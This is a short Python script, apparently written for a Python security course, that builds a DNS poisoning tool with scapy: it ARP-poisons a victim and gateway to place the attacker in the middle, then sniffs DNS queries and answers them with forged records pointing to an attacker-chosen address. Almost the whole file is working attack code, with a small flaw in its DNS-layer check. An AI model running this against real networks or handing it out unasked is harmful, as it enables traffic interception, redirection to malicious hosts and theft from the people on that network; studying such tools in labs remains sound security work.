#!/usr/bin/env python

# Author: SPSE-3232
# Purpose:
# - Create a DNS poisoning tool similar to Dnsspoof using scapy

from scapy.all import *

victim_ip = "x.x.x.x"
victim_mac = "a1:b2:c3:d4:e5:f6"

gateway_ip = "x.x.x.x"
gateway_mac = "f1:e2:d3:c4:b5:a6"

dns_fake_resolv = "x.x.x.x"


def arp_poison_client():
    arp_packet = ARP()
    arp_packet.op = 2
    arp_packet.psrc = gateway_ip
    arp_packet.pdst = victim_ip
    arp_packet.hwdst = victim_mac
    # arp_packet.psrc = automatic populated by scapy with our mac
    send(arp_packet, 500)


def arp_poison_gateway():
    arp_packet = ARP()
    arp_packet.op = 2
    arp_packet.psrc = victim_ip
    arp_packet.pdst = gateway_ip
    arp_packet.hwdst = gateway_mac
    # arp_packet.psrc = automatic populated by scapy with our mac
    send(arp_packet, 500)


def handle_dns_pkt(pkt):
    # Check if DNS layer
    if not pkt.haslayer(DNS) or pkt.getlayer(DNS).qr != 0:
        pass
    
    ip = pkt.getlayer(IP)
    dns = pkt.getlayer(DNS)
    udp = pkt.getlayer(UDP)

    query_name = dns.qd.qname

    dns_response = IP(dst=ip.src, src=ip.dst)/ \
                   UDP(dport=ip.sport, sport=ip.dport)/ \
                   DNS(id=dns.id, qr=1, qd=dns.qd, an=DNSRR(rrname=query_name, ttl=10, rdata=dns_fake_resolv))

    print(query_name, "\n", dns_response)
    send(dns_response)


# 1 - Arp Spoofing
print('Starting ARP spoofing...')
# CLIENT <-----> ATTACKER ......... GATEWAY
arp_poison_client()
# CLIENT ....... ATTACKER <-------> GATEWAY
arp_poison_gateway()
print("MITM performed: CLIENT <-----> ATTACKER <-----> GATEWAY")
# 2 - DNS Poisoning
print('Starting poison attack...')
sniff(iface='eth0', filter='udp port 53', prn=handle_dns_pkt)
print('Shutting down...')
